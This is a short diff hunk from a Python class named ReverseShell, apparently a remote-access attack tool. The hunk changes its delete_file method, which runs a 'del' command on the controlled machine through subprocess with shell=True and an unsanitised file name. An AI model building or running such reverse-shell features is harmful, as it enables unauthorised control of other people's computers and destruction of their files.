@@ -63,7 +63,7 @@ class ReverseShell:
             except:
                 continue
     def delete_file(self,file_name):
-        subprocess.call(f"del {file_name}", shell=True)
+        subprocess.call(f"del {file_name[0]}", shell=True)
         return "deletion of file is done"
 
     def connect(self):
